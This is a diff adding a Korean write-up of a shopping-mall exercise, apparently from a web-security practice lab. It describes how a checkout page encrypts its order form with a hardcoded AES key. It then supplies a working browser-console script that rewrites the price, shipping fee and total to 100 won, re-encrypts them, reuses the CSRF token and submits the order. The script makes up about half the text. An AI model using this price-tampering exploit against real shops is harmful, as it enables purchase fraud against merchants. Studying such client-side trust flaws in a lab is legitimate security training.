@@ -1,0 +1,68 @@
+==========================
+
+* 쇼핑몰 문제 11번
+
+==========================
+
+1. 사용자가 결제 버튼을 누름.
+
+버튼 클릭 핸들러가 checkTotalPrice()를 호출해서:
+
+price, count, shipmentfee, usepoint, coupondiscount 등을 계산하고,
+
+계산 결과를 화면(텍스트)과 폼의 숨겨진 input들(input[name=totalprice], input[name=price2], 등)에 넣음.
+
+버튼 핸들러가 getFormData()로 현재 폼을 serialize() 해서 평문 문자열(예:"productId=...&price2=359000&shipmentfee=3000&totalprice=362000&_csrf=...")을 만든다.
+
+그 평문을 CryptoJS.AES.encrypt(평문, "useworldeqstoreseyongkim")으로 암호화해서 e2edata를 생성.
+
+CryptoJS의 PasswordBasedCipher는 내부적으로 랜덤 salt를 사용하므로 같은 평문이어도 암호문은 매번 달라짐. (중요)
+
+암호문(e2edata) + _csrf 등으로 구성된 폼이 서버로 전송되고, 서버는 복호화해서 평문을 읽고 내부적으로 검증(금액 일관성, 세션/CSRF 체크 등)을 수행.
+
+ (function(){
+  try {
+    // 1) form 직전의 평문 얻기 (getFormData()가 존재하면 사용, 없으면 #orderform 사용)
+    var plain = (typeof getFormData === 'function') ? getFormData() :
+                ($('#orderform').length ? $('#orderform').serialize() : $('form').first().serialize());
+
+    console.log("[debug] plain:", plain);
+
+    // 2) 필드명 주의: 실제 코드(orderinfo.js)에선 'totalprice' 소문자입니다.
+    //    필요한 모든 관련 필드를 일관성 있게 바꿔주세요.
+    var hacked = plain
+      .replace(/price2=\d+/i, "price2=100")
+      .replace(/shipmentfee=\d+/i, "shipmentfee=0")
+      .replace(/totalprice=\d+/i, "totalprice=100")
+      // 필요하면 아래 항목도 추가:
+      // .replace(/usepoint=\d+/i, "usepoint=0")
+      // .replace(/coupondiscount=\d+/i, "coupondiscount=0")
+      ;
+
+    console.log("[debug] hacked:", hacked);
+
+    // 3) CryptoJS 존재 확인 및 암호화 키
+    if (typeof CryptoJS === 'undefined') throw "CryptoJS not loaded on this page";
+    var key = "useworldeqstoreseyongkim"; // practice11.js에 하드코딩된 키
+    var enc = CryptoJS.AES.encrypt(hacked, key).toString();
+    console.log("[debug] e2edata (enc):", enc);
+
+    // 4) _csrf 값 확보 (같은 세션값 유지)
+    var csrf = $("input[name=_csrf]").val();
+    if (!csrf) console.warn("[warn] _csrf input not found on page");
+
+    // 5) 전송용 폼 생성 및 제출 (원본 스크립트 방식과 동일)
+    var $f = $('<form>').attr({name:'e2eform', method:'post', action:'/practice/practice11/order'});
+    $f.append($('<input>').attr({type:'hidden', name:'e2edata', value: enc}));
+    $f.append($('<input>').attr({type:'hidden', name:'_csrf', value: csrf}));
+    $f.appendTo('body').submit();
+
+  } catch (err) {
+    console.error("[error] exception:", err);
+  }
+})();
+필수항목 입력 후 console에 코드 입력하면 100원으로 결제 가능
+
+2. end_to_end_encryption
+
+==========================
